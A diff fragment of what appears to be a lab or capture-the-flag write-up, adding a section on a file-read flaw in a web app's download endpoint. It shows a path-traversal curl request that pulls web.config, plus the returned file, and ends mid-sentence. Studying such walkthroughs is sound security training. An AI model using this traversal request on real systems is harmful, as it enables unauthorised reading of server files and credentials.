@@ -484,4 +484,26 @@ This user is compromised
 
 # File Read vulnerability
 
-So this vulnerability 
+So this vulnerability can be used to capture the hash, but it can also be used to pull other files from the system, like `web.config`
+
+```python
+curl --negotiate -u : 'http://lus2dc.lustrous2.vl/File/Download?fileName=../../web.config' 
+<?xml version="1.0" encoding="utf-8"?>
+<configuration>
+  <location path="." inheritInChildApplications="false">
+    <system.webServer>
+      <handlers>
+        <add name="aspNetCore" path="*" verb="*" modules="AspNetCoreModuleV2" resourceType="Unspecified" />
+      </handlers>
+      <aspNetCore processPath="dotnet" arguments=".\LuShare.dll" stdoutLogEnabled="false" stdoutLogFile=".\logs\stdout" hostingModel="inprocess" />
+    </system.webServer>
+  </location>
+</configuration>
+<!--ProjectGuid: 4E46018E-B73C-4E7B-8DA2-87855F22435A-->
+```
+
+Ill remove the `-I` since i no longer want to send a HEAD
+
+And now i get the contents
+
+Looks like its referring to a file ``
